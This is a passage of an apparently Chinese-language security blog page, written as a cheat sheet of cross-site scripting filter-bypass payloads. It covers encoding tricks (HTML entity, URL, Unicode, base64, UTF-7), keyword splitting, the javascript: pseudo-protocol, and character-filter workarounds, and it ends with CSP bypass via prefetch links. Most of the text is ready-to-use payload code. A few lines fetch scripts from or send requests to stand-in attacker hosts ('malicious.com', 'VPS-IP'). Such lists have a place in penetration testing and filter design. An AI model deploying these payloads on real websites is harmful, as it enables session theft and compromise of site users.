+<li><code>href</code>：用于定义超链接的目的地，攻击者可能会在其中嵌入JavaScript代码。<ul>
+<li>例如：<code>&lt;a href=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;Click me&lt;/a&gt;</code></li>
+</ul>
+</li>
+<li><code>src</code>：通常用于<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>等标签，指定外部资源的路径，可能会被用来加载并执行恶意脚本。<ul>
+<li>例如：<code>&lt;script src=&quot;http://malicious.com/xss.js&quot;&gt;&lt;/script&gt;</code></li>
+</ul>
+</li>
+<li><code>onclick</code>、<code>onerror</code>、<code>onmouseover</code>、<code>onmouseout</code>、<code>onload</code>：这些事件属性可以触发JavaScript代码的执行。<ul>
+<li>例如：<code>&lt;img src=&quot;x&quot; onerror=&quot;alert(&#39;XSS&#39;)&quot; /&gt;</code></li>
+</ul>
+</li>
+<li><code>style</code>：可以包含CSS样式，但也可能通过CSS表达式来执行JavaScript。<ul>
+<li>例如：<code>&lt;div style=&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</code></li>
+</ul>
+</li>
+<li><code>value</code>：表单元素的值，如果处理不当，也可能成为XSS攻击的途径。<ul>
+<li>例如：<code>&lt;input type=&quot;text&quot; value=&quot;</code>alert('XSS')<code>&quot; onfocus=&quot;eval(this.value)&quot;&gt;</code></li>
+</ul>
+</li>
+<li><code>data</code>：某些现代浏览器支持<code>data:</code>协议，允许在HTML中直接嵌入数据，这也可能被滥用。<ul>
+<li>例如：<code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgp&quot;&gt;&lt;/object&gt;</code></li>
+</ul>
+</li>
+<li><code>background</code>：与<code>&lt;img&gt;</code>标签的<code>src</code>类似，<code>&lt;body&gt;</code>标签的<code>background</code>属性也可能被用于XSS攻击。</li>
+<li><code>action</code>：在<code>&lt;form&gt;</code>标签中定义表单提交的URL，如果允许用户输入，可能会被用来执行XSS攻击。</li>
+<li><code>dynsrc</code>：与<code>&lt;embed&gt;</code>和<code>&lt;object&gt;</code>标签相关，用于指定动态加载的媒体资源，也可能被用于加载恶意脚本。</li>
+</ol>
+<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">xxxxx?q=&lt;sCriPt&gt;alert(1)&lt;sCriPt&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>有些waf会将关键字替换为空，这时候就可以双写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h2><p>拼接绕过的思路就是利用一些关键字能够拿到函数名或者利用eval能够将字符串当作js代码执行。</p>
+<p><strong>eval</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>top</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p><code>top</code> 是一个关键字，通常用于引用浏览器窗口的顶层框架（frame）。</p>
+<p><code>top</code> 是用来确保这段代码能在当前页面的顶层窗口执行，而不是在某个嵌套的框架或iframe中执行。这样做可以确保攻击者能够突破框架的安全限制，直接对顶层浏览器窗口进行操作。</p>
+<p><strong>window</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p><code>window</code> 对象代表当前浏览器窗口的一个实例。它是全局对象，意味着在浏览器的全局作用域内定义的任何变量或函数都隐式地作为<code>window</code>对象的属性。</p>
+<p>通过使用方括号表示法 <code>window[&#39;al&#39;+&#39;ert&#39;]</code>，代码在运行时动态地构建了字符串<code>&#39;alert&#39;</code>，然后作为属性名去访问<code>window</code>对象上的<code>alert</code>函数。</p>
+<p><strong>self</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p><code>self</code> 是一个全局对象，它引用当前的执行环境，即全局上下文。在普通的浏览器环境中，<code>self</code> 通常与 <code>window</code> 对象是等价的，因为浏览器中的全局上下文就是 <code>window</code> 对象。</p>
+<p><strong>parent</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p><code>parent</code> 关键字被用于引用当前文档的父级窗口或框架。在HTML页面中，如果存在iframe或frame，每个框架都有自己的 <code>window</code> 对象，而 <code>parent</code> 对象提供了一种方式来引用这些不同层级的对象。</p>
+<p><code>parent</code> 对象是一个特殊的全局对象，它指向含有当前执行代码的窗口或框架的直接父级。如果当前执行代码的窗口是顶层窗口，那么 <code>parent</code> 和 <code>window</code> 是相同的。如果代码运行在一个框架中，<code>parent</code> 将指向包含该框架的窗口。</p>
+<p><strong>frames</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p><code>frames</code> 关键字被用于引用浏览器窗口中的所有框架（frames）和iframe元素。在HTML中，<code>&lt;frameset&gt;</code> 或 <code>&lt;iframe&gt;</code> 元素可以被用来创建框架，这些框架可以包含其他网页，每个网页都有其独立的文档和窗口对象。</p>
+<h2 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这些函数在其他标签也可以使用</p>
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>也就是利用各种实体编码或者实体名称绕过</p>
+<p>html实体编码也就是转义一些在html中有特殊意义的字符，比如<、>之类的</p>
+<table>
+<thead>
+<tr>
+<th>显示结果</th>
+<th>描述</th>
+<th>实体名称</th>
+<th>十进制实体编码</th>
+<th>十六进制实体编码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td>空格</td>
+<td>&amp;nbsp;</td>
+<td>&amp;#160;</td>
+<td>&amp;#x20;</td>
+</tr>
+<tr>
+<td><</td>
+<td>小于号</td>
+<td>&amp;lt;</td>
+<td>&amp;#60;</td>
+<td>&amp;#x3c;</td>
+</tr>
+<tr>
+<td>></td>
+<td>大于号</td>
+<td>&amp;gt;</td>
+<td>&amp;#62;</td>
+<td>&amp;#x3e;</td>
+</tr>
+<tr>
+<td>"</td>
+<td>双引号</td>
+<td>&amp;quot;</td>
+<td>&amp;#34;</td>
+<td>&amp;#x22;</td>
+</tr>
+<tr>
+<td>+</td>
+<td>加号</td>
+<td>&amp;plus;</td>
+<td>&amp;#43;</td>
+<td>&amp;#x2B;</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p> HTML 中的常用字符实体是不间断空格。</p>
+<p>（注意：实体名称对大小写敏感！） </p>
+<p>字符实体类似这样：&entity_name; 或者 &#entity_number;</p>
+</blockquote>
+<p>比如可以这样写：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;aaa&lt;/a&gt;<br>//下面是不带分号的写法<br>&lt;a href=&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&gt;aaa&lt;/a&gt;<br>//还可以填充0<br>&lt;a href=&quot;&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&quot;&gt;aaa&lt;/a&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这个出来就是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;javascript:alert(1)&quot;&gt;aaa&lt;/a&gt;<br></code></pre></td></tr></table></figure>
+
+<p>相关的实体编码可以在这个网站查找：<a target="_blank" rel="noopener" href="https://symbl.cc/cn/unicode/blocks/basic-latin/#subblock-0061">https://symbl.cc/cn/unicode/blocks/basic-latin/#subblock-0061</a></p>
+<p><strong>还可以url编码</strong></p>
+<p>当注入点存在href或者src时可以使用url编码，但是编码时不能对协议类型进行任何操作</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;<br>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;<br>//url编码<br>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/a&gt;<br>&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/iframe&gt;<br>//可以二次编码<br>&lt;a href=&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;&gt;test&lt;/a&gt;<br>&lt;iframe src=&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;&gt;test&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>js编码</strong></p>
+<p>js编码解析的时候字符或者字符串仅会被解码为字符串文本或者标识符名称，例如 js 解析器工作的时候将<code>\u0061\u006c\u0065\u0072\u0074</code>进行解码后为<code>alert</code>，而<code>alert</code>是一个有效的标识符名称，它是能被正常解析的。但是像圆括号、双引号、单引号等等这些字符就只能被当作普通的文本，从而导致无法执行。</p>
+<p>由于 js 是最后进行解析的，所以如果混合编码，需要先使用 js 编码再进行 url 编码或者 html 实体编码。</p>
+<p>js编码策略：</p>
+<ol>
+<li>"&quot; 加上三个八进制数字，如果个数不够，前面补0，例如 "<" 编码为 "\074"</li>
+<li>"\x" 加上两个十六进制数字，如果个数不够，前面补0，例如 "<" 编码为 "\x3c"</li>
+<li>"\u" 加上四个十六进制数字，如果个数不够，前面补0，例如 "<" 编码为 "\u003c"</li>
+<li>对于一些控制字符，使用特殊的 C 类型的转义风格（例如 \n 和 \r）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;<br>&lt;input onfocus=location=&quot;alert(1)&quot; autofocus&gt; <br><br>//Unicode编码<br>&lt;img src=x onerror=&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;<br>&lt;input onfocus=location=&quot;javascript:\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&quot; autofocus&gt; <br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Unicode编码时只能对有效的标识进行编码，否则非标识符被解码后是不能执行的，比如：alert(1)只能对alert和1进行编码，括号编码后会失去作用，不能执行</p>
+<p>如果用eval、setTimeout等函数传递变量时就可以对整个传递参数进行编码，例如：<strong>例如 eval("alert(1)")，可以对 "alert(1)" 整个进行八进制、十六进制或者 Unicode 编码(双引号不参与)。</strong></p>
+</blockquote>
+<p>所以浏览器的解析过程是：html解析 —— url解析 —— js解析</p>
+<p>我们还可以用一些混合编码和组合编码进行绕过，具体参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/340080.html">xss 常用标签及绕过姿势总结 - FreeBuf网络安全行业门户</a></p>
+<p><strong>base64编码</strong></p>
+<p>我们还可以利用data伪协议进行base64编码绕过</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//编码的内容为：&lt;script&gt;alert(/xss/)&lt;/script&gt;<br>1.&lt;object&gt; 标签<br>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;<br>2.&lt;a&gt; 标签<br>&lt;a href=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;test&lt;/a&gt;   （新版浏览器不支持）<br>3.&lt;iframe&gt; 标签<br>&lt;iframe src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;<br>4.&lt;embed&gt; 标签<br>&lt;embed src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>编码解码函数</strong></p>
+<p>atob()函数用于base64解码</p>
+<p>btoa()函数用于base64编码</p>
+<p><strong>其他字符集编码绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//UTF-7，&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;<br>+ADw-script+AD4-alert(&#x27;XSS&#x27;)+ADsAPA-/script+AD4-<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240430092823778.png" alt="image-20240430092823778"></p>
+<p><strong>UTF-16</strong>： UTF-16使用2个或4个字节来表示Unicode字符。攻击者可能会尝试将JavaScript代码编码为UTF-16字节顺序标记（BOM），并将其插入到输入字段中。一些系统可能会错误地将这些字节解释为UTF-16文本，而不是JavaScript代码。</p>
+<p>例如，<code>\u2028</code>（UTF-16的行分隔符）和<code>\u2029</code>（UTF-16的段落分隔符）有时可以用来绕过基于行的输入过滤器。</p>
+<h2 id="js伪协议"><a href="#js伪协议" class="headerlink" title="js伪协议"></a>js伪协议</h2><p> 伪协议的形式就是：<strong>javascript:alert(/xss/)</strong></p>
+<p>在插入js代码的地方都可以尝试一下伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt;<br>&lt;iframe src=javascript:alert(&#x27;xss&#x27;);&gt;&lt;/iframe&gt;<br>&lt;img src=javascript:alert(&#x27;xss&#x27;)&gt;//IE7以下<br>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;<br>&lt;body background=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;html&gt;&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>A位置可填充 /，/123/，%09，%0A，%0C，%0D，%20</li>
+<li>B位置可填充 %09，%0A，%0C，%0D，%20</li>
+<li>C位置可填充 %0B，/**/，如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20</li>
+<li>D位置可填充 %09，%0A，%0C，%0D，%20，//，></li>
+</ul>
+<h2 id="圆括号过滤绕过"><a href="#圆括号过滤绕过" class="headerlink" title="圆括号过滤绕过"></a>圆括号过滤绕过</h2><p><strong>反引号替换</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert`1`&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>throw绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;video src onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;<br>&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h2><p><strong>斜杠替换</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(/xss/)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>反引号替换</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(`xss`)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="地址过滤"><a href="#地址过滤" class="headerlink" title="地址过滤"></a>地址过滤</h2><p><strong>http被过滤</strong></p>
+<p>可以用<code>//</code>代替<code>http://</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;<br></code></pre></td></tr></table></figure>
+
+<p>可以使用<code>\\</code>，不过这在Linux下才能代替http://，在Windows下相当于file协议</p>
+<p><strong>逗号过滤</strong></p>
+<p>可以用中文逗号代替英文逗号，中文逗号会被自动转成英文逗号；中文的句号也可以代替点。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://www。baidu。com`&quot;&gt;//会自动跳转到百度<br></code></pre></td></tr></table></figure>
+
+<h2 id="alert过滤"><a href="#alert过滤" class="headerlink" title="alert过滤"></a>alert过滤</h2><p>可以利用其他的函数来替换</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;prompt(&#x27;Evi1s7&#x27;)&lt;/script&gt;<br>&lt;script&gt;confirm(&#x27;Evi1s7&#x27;)&lt;/script&gt;<br>&lt;script&gt;console.log(&#x27;Evi1s7&#x27;)&lt;/script&gt;<br>&lt;script&gt;document.write(&#x27;Evi1s7&#x27;)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><p>可以利用拆分的方法，利用eval函数和变量赋值的方法进行拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;<br>&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;<br>&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;<br>&lt;script&gt;a=a+&#x27;rt&gt;Evi1s7&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;<br>&lt;script&gt;eval(a)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>还可以利用加载外部js文件</strong></p>
+<ul>
+<li><p><code>$.getScript</code>：<code>$.getScript</code> 是 jQuery 库提供的一个函数，它允许你异步地从服务器加载 JavaScript 文件。这个函数非常适合用于在页面加载之后按需加载脚本，从而可以改善网页的响应速度和性能。</p>
+<p>假设你有一个 JavaScript 文件 <code>example.js</code>，里面包含了一些页面加载后需要执行的代码，可以这样使用：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">$.<span class="hljs-title function_">getScript</span>(<span class="hljs-string">&quot;example.js&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Script loaded and executed successfully!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><code>$.get</code></p>
+<p><code>$.get</code> 是 jQuery 库中的一个函数，用于执行 HTTP GET 请求。它可以用来从服务器异步地加载数据，并且通常用于请求 JSON、HTML、XML 或脚本文件。</p>
+<p>基本语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$.get(url, data, successCallback, dataType)<br><br>url：要请求的资源的 URL。<br>data：（可选）一个键值对的映射，表示要发送的查询字符串参数。<br>successCallback：（可选）一个回调函数，当请求成功时执行。它接受一个参数，通常是响应的数据。<br>dataType：（可选）预期的服务器响应的数据类型。例如：&quot;json&quot;, &quot;html&quot;, &quot;text&quot;, &quot;xml&quot; 等。<br></code></pre></td></tr></table></figure>
+
+<p>示例：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">$.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;example.com/data&quot;</span>, &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;value&quot;</span> &#125;, <span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>    <span class="hljs-comment">// 处理加载的数据</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;, <span class="hljs-string">&quot;json&quot;</span>);<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="过滤分号"><a href="#过滤分号" class="headerlink" title="过滤分号"></a>过滤分号</h2><p>可以使用花括号进行语句的分隔</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h2><h3 id="CSP介绍"><a href="#CSP介绍" class="headerlink" title="CSP介绍"></a>CSP介绍</h3><p>这里先了解一下什么是CSP：</p>
+<p>Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。</p>
+<p><strong>配置</strong></p>
+<p>CSP策略可以通过 HTTP 头信息或者 meta 元素定义。</p>
+<p>CSP 有三类：</p>
+<ul>
+<li>Content-Security-Policy (Google Chrome)</li>
+<li>X-Content-Security-Policy (Firefox)</li>
+<li>X-WebKit-CSP (WebKit-based browsers, e.g. Safari)</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HTTP header :<br>&quot;Content-Security-Policy:&quot; 策略<br>&quot;Content-Security-Policy-Report-Only:&quot; 策略<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HTML Meta :<br>&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;策略&quot;&gt;<br>&lt;meta http-equiv=&quot;content-security-policy-report-only&quot; content=&quot;策略&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>主要指令</strong></p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>default-src</td>
+<td>定义资源默认加载策略</td>
+</tr>
+<tr>
+<td>connect-src</td>
+<td>定义 Ajax、WebSocket 等加载策略</td>
+</tr>
+<tr>
+<td>font-src</td>
+<td>定义 Font 加载策略</td>
+</tr>
+<tr>
+<td>frame-src</td>
+<td>定义 Frame 加载策略</td>
+</tr>
+<tr>
+<td>img-src</td>
+<td>定义图片加载策略</td>
+</tr>
+<tr>
+<td>media-src</td>
+<td>定义 <audio>、<video> 等引用资源加载策略</td>
+</tr>
+<tr>
+<td>object-src</td>
+<td>定义 <applet>、<embed>、<object> 等引用资源加载策略</td>
+</tr>
+<tr>
+<td>script-src</td>
+<td>定义 JS 加载策略</td>
+</tr>
+<tr>
+<td>style-src</td>
+<td>定义 CSS 加载策略</td>
+</tr>
+<tr>
+<td>base-uri</td>
+<td>定义 <base> 根URL策略，不使用default-src作为默认值</td>
+</tr>
+<tr>
+<td>sandbox</td>
+<td>值为 allow-forms，对资源启用 sandbox</td>
+</tr>
+<tr>
+<td>report-uri</td>
+<td>值为 /report-uri，提交日志</td>
+</tr>
+</tbody></table>
+<p><strong>关键字</strong></p>
+<ul>
+<li><p><code>-</code></p>
+<p>允许从任意url加载，除了 <code>data:</code> <code>blob:</code> <code>filesystem:</code> <code>schemes</code></p>
+<p>e.g. <code>img-src -</code></p>
+</li>
+<li><p><code>none</code></p>
+<p>禁止从任何url加载资源</p>
+<p>e.g. <code>object-src &#39;none&#39;</code></p>
+</li>
+<li><p><code>self</code></p>
+<p>只可以加载同源资源</p>
+<p>e.g. <code>img-src &#39;self&#39;</code></p>
+</li>
+<li><p><code>data:</code></p>
+<p>可以通过data协议加载资源</p>
+<p>e.g. <code>img-src &#39;self&#39; data:</code></p>
+</li>
+<li><p><code>blob:</code>:</p>
+<p>表示允许加载blob URL格式的资源。</p>
+<p>e.g. <code>img-src &#39;self&#39; blob:</code></p>
+</li>
+<li><p><code>domain.example.com</code></p>
+<p>e.g. <code>img-src domain.example.com</code>只可以从特定的域加载资源</p>
+</li>
+<li><p><code>\*.example.com</code></p>
+<p>e.g. <code>img-src \*.example.com</code>可以从任意example.com的子域处加载资源</p>
+</li>
+<li><p><code>https://cdn.com</code></p>
+<p>e.g. <code>img-src https://cdn.com</code>只能从给定的域用https加载资源</p>
+</li>
+<li><p><code>https:</code></p>
+<p>e.g. <code>img-src https:</code>只能从任意域用https加载资源</p>
+</li>
+<li><p><code>unsafe-inline</code></p>
+<p>允许内部资源执行代码例如style attribute,onclick或者是sicript标签</p>
+<p>e.g. <code>script-src &#39;unsafe-inline&#39;</code></p>
+</li>
+<li><p><code>unsafe-eval</code></p>
+<p>允许一些不安全的代码执行方式，例如js的eval()</p>
+<p>e.g. <code>script-src &#39;unsafe-eval&#39;</code></p>
+</li>
+<li><p><code>nonce-&lt;base64-value&gt;&#39;</code></p>
+<p>使用随机的nonce，允许加载标签上nonce属性匹配的标签</p>
+<p>e.g. <code>script-src &#39;nonce-bm9uY2U=&#39;</code></p>
+</li>
+<li><p><code>&lt;hash-algo&gt;-&lt;base64-value&gt;&#39;</code></p>
+<p>允许hash值匹配的代码块被执行</p>
+<p>e.g. <code>script-src &#39;sha256-&lt;base64-value&gt;&#39;</code></p>
+</li>
+</ul>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>就是利用上面一些有风险的csp设置来绕过，比如unsafe-inline、unsafe-eval等等。相当于利用白名单绕过。</p>
+<p><strong>预加载</strong></p>
+<p>大概就是利用浏览器空闲的时候去加载指定的内容，然后缓存起来。</p>
+<p>HTML5页面预加载是用link标签的rel属性来指定的。如果csp头有unsafe-inline，则用预加载的方式可以向外界发出请求，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;!-- 预加载某个页面 --&gt;<br>&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- firefox --&gt;<br>&lt;link rel=&#x27;prerender&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- chrome --&gt;<br>&lt;!-- 预加载某个图片 --&gt;<br>&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx/x.jpg&#x27;&gt;<br>&lt;!-- DNS 预解析 --&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxxx&quot;&gt;<br>&lt;!-- 特定文件类型预加载 --&gt;<br>&lt;link rel=&#x27;preload&#x27; href=&#x27;//xxxxx/xx.js&#x27;&gt;&lt;!-- chrome --&gt;<br></code></pre></td></tr></table></figure>
